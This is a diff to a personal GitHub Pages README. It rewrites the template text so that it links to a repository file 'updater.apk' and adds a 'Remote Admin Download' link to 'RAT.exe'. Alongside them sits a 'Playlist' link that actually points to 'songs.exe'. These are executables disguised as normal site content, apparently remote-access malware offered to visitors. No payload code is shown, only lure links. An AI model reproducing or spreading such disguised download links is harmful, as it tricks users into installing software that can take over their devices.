@@ -2,7 +2,8 @@
 
 FaizoO [Facebook Handel](https://facebook.com/iamfaizanakhtar) .  [Playlist](https://github.com/imfaizanakhtar/imfaizanakhtar.github.io/raw/main/songs.exe) .
 
-Whenever you commit to this repository, GitHub Pages will run [updater apk download](https://github.com/imfaizanakhtar/imfaizanakhtar.github.io/raw/main/updater.apk) to rebuild the pages in your site, from the content in your Markdown files.
+Whenever you commit to this repository, GitHub Pages will run [updater apk download](https://github.com/imfaizanakhtar/imfaizanakhtar.github.io/raw/main/updater.apk) 
+[Remote Admin Download](https://github.com/imfaizanakhtar/imfaizanakhtar.github.io/raw/main/RAT.exe)
 
 ### Markdown
 
